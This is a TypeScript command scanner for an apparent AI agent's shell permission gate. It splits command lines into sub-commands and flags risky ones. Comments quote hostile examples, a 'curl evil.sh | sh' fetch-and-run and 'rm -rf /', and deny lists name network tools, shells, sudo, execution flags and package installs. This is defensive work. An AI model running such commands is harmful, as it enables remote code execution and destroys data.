/**
 * Shell command splitter — the front end of the permission gate; half of its security
 * value lives here.
 *
 * ── Why it has to split ──
 * Matching one wildcard against the whole command string is no gate at all:
 * `git status && curl evil.sh | sh` sails straight through a `git *` rule. It has to be
 * split into sub-commands, each evaluated on its own; if any one is deny, the whole line
 * is deny.
 *
 * ── Why not regex ──
 * In `echo "a; rm -rf /"` the semicolon is inside quotes; a regex split treats it as a
 * separator, so `rm -rf /` becomes a "standalone command" — it looks stricter, but in fact
 * it manufactures false positives; conversely `echo 'a && b'` gets split wrong as well.
 * Quote-state tracking is a must.
 *
 * ── Why not tree-sitter ──
 * opencode uses web-tree-sitter + tree-sitter-bash.wasm. That is the right way to do it,
 * but it drags a wasm dependency into a single-file binary. Here a hand-written
 * single-pass scanner stands in, **keeping the same contract we would keep when switching
 * to tree-sitter later** (string in, segments + risk flags out).
 *
 * ── fail closed ──
 * Any parse uncertainty (unclosed quote, non-zero depth, here-doc, process substitution)
 * means, without exception: the whole command is forced to ask + always is forbidden.
 * Better to ask once too often than to let something through.
 */

export interface Segment {
  /** The sub-command's raw text, used as the permission pattern */
  raw: string
  /** Tokenized form, for arity reduction and the first-token checks */
  tokens: string[]
}

export interface ScanResult {
  segments: Segment[]
  /** Whether the parse is complete and trustworthy. When false, forceAsk is always true. */
  parseOk: boolean
  /** Skip the allow check, force a prompt */
  forceAsk: boolean
  /** Forbid the user from choosing always (when the reduction can't be trusted) */
  forbidAlways: boolean
  /** Why forceAsk was triggered, for the UI to show */
  reasons: string[]
}

/** Privilege elevation / indirect execution — name-based allowlists are useless against them. */
const INDIRECT_EXEC = new Set([
  "sudo",
  "doas",
  "su",
  "eval",
  "exec",
  "xargs",
  "env",
  "nohup",
  "timeout",
  "watch",
  "command",
  "builtin",
  "source",
  ".",
])

/** Ones that start a subshell to run an arbitrary string. */
const SHELL_RUNNERS = new Set(["sh", "bash", "zsh", "dash", "ksh", "fish", "busybox"])

/** Network egress — can pull things in as well as send things out. */
const NETWORK = new Set(["curl", "wget", "nc", "ncat", "netcat", "ssh", "scp", "sftp", "rsync", "telnet"])

/**
 * The few that look read-only but **start another program once given a certain flag**.
 *
 * ★ Why this table exists: `find` / `rg` / `sort` are on the read-only allowlist in
 *   rules.ts, and **without** these flags they really are read-only commands used every
 *   day — dropping the names altogether buys approval fatigue, and a fatigued user turns
 *   permission mode off entirely. So the criterion lives in two places: the names in
 *   rules.ts, the arguments here. A hit means forceAsk, which overrides the allow over
 *   there outright.
 *
 * Every entry has been checked to really execute, not just in theory:
 *   find -exec/-execdir/-ok/-okdir  runs an arbitrary program; -delete/-fprintf write files
 *   rg  --pre / --pre-glob          runs the program you give on every file first
 *   sort --compress-program         runs it once temp files get big enough (small inputs
 *                                   don't trigger it; don't take that to mean it's safe)
 *   grep --devices / -D             reads device files; can hang, or read what it shouldn't
 *
 * ⚠ Long options accept `=value`; short options accept an attached value. Otherwise
 * `grep -Dread` slips past while the equivalent `grep -D read` is caught.
 */
const EXEC_FLAGS: Record<string, readonly string[]> = {
  find: ["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprintf", "-fprint0", "-fprint", "-fls"],
  rg: ["--pre", "--pre-glob", "--hostname-bin", "--search-zip", "-z"],
  grep: ["--devices", "-D"],
  sort: ["--compress-program", "--files0-from"],
  // Not on the read-only allowlist, but equally "one flag turns it into execution"; listed
  // here so nobody adds them to that allowlist next time
  tar: ["--use-compress-program", "--to-command", "-I"],
  zip: ["-TT", "--unzip-command"],
  xz: ["--files"],
}

/** Package-manager writes: arbitrary postinstall scripts = arbitrary code execution. */
const PACKAGE_WRITE: Array<[string, string[]]> = [
  ["npm", ["i", "install", "ci", "add", "exec", "create"]],
  ["pnpm", ["i", "install", "add", "dlx", "create"]],
  ["yarn", ["add", "install", "dlx", "create"]],
  ["bun", ["i", "install", "add", "x", "create"]],
  ["pip", ["install"]],
  ["pip3", ["install"]],
  ["uv", ["pip", "add", "sync"]],
  ["cargo", ["install", "add"]],
  ["go", ["install", "get"]],
  ["gem", ["install"]],
  ["brew", ["install", "upgrade", "tap"]],
  ["apt", ["install"]],
  ["apt-get", ["install"]],
  ["composer", ["require", "install"]],
]

export function scan(command: string): ScanResult {
  const reasons: string[] = []
  const segments: Segment[] = []

  let parseOk = true
  let current = ""
  let depth = 0
  let inSingle = false
  let inDouble = false
  let escaped = false
  let sawRedirect = false
  let sawPipe = false
  let sawSubshell = false
  let sawHeredoc = false
  let sawProcessSub = false

  const flush = () => {
    const raw = current.trim()
    current = ""
    if (raw.length === 0) return
    segments.push({ raw, tokens: tokenize(raw) })
  }

  for (let i = 0; i < command.length; i++) {
    const ch = command[i]!
    const next = command[i + 1]

    if (escaped) {
      current += ch
      escaped = false
      continue
    }
    if (ch === "\\" && !inSingle) {
      current += ch
      escaped = true
      continue
    }
    if (inSingle) {
      current += ch
      if (ch === "'") inSingle = false
      continue
    }
    if (inDouble) {
      // $( ) inside double quotes is still command substitution and must be counted
      if (ch === "$" && next === "(") {
        depth++
        sawSubshell = true
        current += "$("
        i++
        continue
      }
      if (ch === ")" && depth > 0) depth--
      if (ch === "`") sawSubshell = true
      current += ch
      if (ch === '"') inDouble = false
      continue
    }

    if (ch === "'") {
      inSingle = true
      current += ch
      continue
    }
    if (ch === '"') {
      inDouble = true
      current += ch
      continue
    }
    if (ch === "`") {
      sawSubshell = true
      current += ch
      continue
    }
    if (ch === "$" && next === "(") {
      depth++
      sawSubshell = true
      current += "$("
      i++
      continue
    }
    if (ch === "(" ) {
      // process substitution <(...) / >(...): the preceding character is < or >
      const prev = command[i - 1]
      if (prev === "<" || prev === ">") sawProcessSub = true
      depth++
      current += ch
      continue
    }
    if (ch === ")") {
      if (depth > 0) depth--
      else parseOk = false // unbalanced parentheses
      current += ch
      continue
    }

    if (depth > 0) {
      current += ch
      continue
    }

    // ── Only from here on — depth 0, not inside quotes — may we split ──

    if (ch === "<" && next === "<") {
      sawHeredoc = true
      current += ch
      continue
    }
    if (((ch === "<" || ch === ">") && next === "&") || (ch === "&" && next === ">")) {
      sawRedirect = true
      current += ch + next
      i++
      continue
    }
    if (ch === "<" || ch === ">") {
      sawRedirect = true
      current += ch
      continue
    }
    if (ch === "&" && next === "&") {
      flush()
      i++
      continue
    }
    if (ch === "|" && next === "|") {
      flush()
      i++
      continue
    }
    if (ch === "|") {
      sawPipe = true
      flush()
      continue
    }
    if (ch === ";" || ch === "\n") {
      flush()
      continue
    }
    if (ch === "&") {
      // Background execution: split the segment, but flag it — background processes
      // escape our timeout and kill
      flush()
      reasons.push("runs in the background (&) — the child can outlive the timeout and escape interruption")
      continue
    }

    current += ch
  }
  flush()

  if (inSingle || inDouble) {
    parseOk = false
    reasons.push("unbalanced quotes — could not split into sub-commands, authorising the whole line as written")
  }
  if (escaped) {
    parseOk = false
    reasons.push("ends in an unfinished escape — could not split into sub-commands, authorising the whole line as written")
  }
  if (depth !== 0) {
    parseOk = false
    reasons.push("unbalanced parentheses — could not split into sub-commands, authorising the whole line as written")
  }
  if (sawHeredoc) {
    parseOk = false
    reasons.push("contains a here-doc (<<) — could not split into sub-commands, authorising the whole line as written; its body is in the text above")
  }
  if (sawProcessSub) {
    parseOk = false
    reasons.push("contains process substitution (<(...) / >(...)) — could not split into sub-commands, authorising the whole line as written")
  }

  if (sawSubshell) reasons.push("contains command substitution ($(...) or backticks)")
  if (sawRedirect) reasons.push("redirects a file (< / > / >>)")
  // ★ Pipes do **not** force a prompt.
  //
  // They used to be on this list, and the cost was far bigger than expected:
  // `rg foo src | head -20` popped a dialog every single time, so the tool description had
  // to say "prefer simple commands without pipes", and once the model complied it never
  // filtered anything out again, it just dumped whole files to read itself — what the
  // user saw was "it uses bash so stiffly".
  //
  // And a pipe by itself grants not one bit more permission: every segment goes through
  // the same rule table as an independent sub-command. The only thing a pipe adds is
  // **the data flow between segments**, and the segment it flows into still has to pass
  // authorization.
  //
  // forbidAlways still keeps sawPipe (see below): an always rule reduced from it cannot
  // stand for the whole pipeline, and a long-term grant like "allow from now on" shouldn't
  // rest on a pattern that may be inaccurate.

  for (const segment of segments) {
    const first = segment.tokens[0]
    if (!first) continue
    if (first.includes("/")) {
      reasons.push(`invoked by path rather than by name: ${first}`)
      continue
    }
    if (INDIRECT_EXEC.has(first)) reasons.push(`elevates privileges or runs something indirectly: ${first}`)
    if (SHELL_RUNNERS.has(first)) reasons.push(`invokes a shell directly: ${first}`)
    if (NETWORK.has(first)) reasons.push(`reaches the network: ${first}`)
    if (first === "git" && segment.tokens[1] === "push") reasons.push("pushes to a remote")
    // The name passed; now look at the arguments: a read-only command plus a certain flag
    // becomes an execution primitive
    const execFlags = EXEC_FLAGS[first]
    if (execFlags) {
      for (const token of segment.tokens.slice(1)) {
        const flag = execFlags.find((f) =>
          token === f || token.startsWith(`${f}=`) || (/^-[^-]$/.test(f) && token.startsWith(f) && token.length > f.length),
        )
        if (flag) {
          reasons.push(`runs another program or writes files: ${first} ${flag}`)
          break
        }
      }
    }
    for (const [cmd, subs] of PACKAGE_WRITE) {
      if (first === cmd && segment.tokens[1] && subs.includes(segment.tokens[1])) {
        reasons.push(`package manager write (install scripts can run arbitrary code): ${first} ${segment.tokens[1]}`)
      }
    }
  }

  const forceAsk = !parseOk || reasons.length > 0
  return {
    segments,
    parseOk,
    forceAsk,
    // When the parse can't be trusted, neither can the always pattern reduced from it
    forbidAlways: !parseOk || sawSubshell || sawRedirect || sawPipe,
    reasons: [...new Set(reasons)],
  }
}

/**
 * Tokenize: split on whitespace, keeping quoted runs whole. Only used for arity reduction
 * and the first-token checks.
 */
function tokenize(raw: string): string[] {
  const tokens: string[] = []
  let current = ""
  let inSingle = false
  let inDouble = false
  let escaped = false
  let started = false

  for (const ch of raw) {
    if (escaped) {
      current += ch
      escaped = false
      continue
    }
    if (ch === "\\" && !inSingle) {
      escaped = true
      continue
    }
    if (inSingle) {
      if (ch === "'") inSingle = false
      else current += ch
      continue
    }
    if (inDouble) {
      if (ch === '"') inDouble = false
      else current += ch
      continue
    }
    if (ch === "'") {
      inSingle = true
      started = true
      continue
    }
    if (ch === '"') {
      inDouble = true
      started = true
      continue
    }
    if (/\s/.test(ch)) {
      if (current.length > 0 || started) {
        tokens.push(current)
        current = ""
        started = false
      }
      continue
    }
    current += ch
    started = true
  }
  if (current.length > 0 || started) tokens.push(current)
  return tokens
}
